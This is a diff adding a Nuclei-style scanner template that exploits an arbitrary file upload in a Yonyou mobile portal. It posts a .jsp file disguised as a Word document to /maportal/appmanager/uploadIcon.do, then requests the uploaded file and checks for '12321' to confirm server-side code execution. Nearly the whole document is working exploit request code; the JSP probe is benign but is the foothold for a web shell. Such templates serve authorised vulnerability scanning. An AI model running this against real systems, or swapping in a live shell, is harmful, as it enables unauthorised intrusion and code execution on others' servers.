@@ -1,0 +1,43 @@
+id: yongyouyidong-upload
+
+info:
+  name: yongyouyidong-upload
+  author: yongyouyidong-upload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadIcon.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        
+        ------{{boundary}}
+        Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
+        Content-Type: application/msword
+        
+        
+        <% out.print(111*111); %>
+        ------{{boundary}}--
+      - |
+        GET /maupload/img/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains((body_2), '12321')"
+        condition: and
+
+    extractors:
+
+      - type: dsl
+        dsl:
+          - body_2
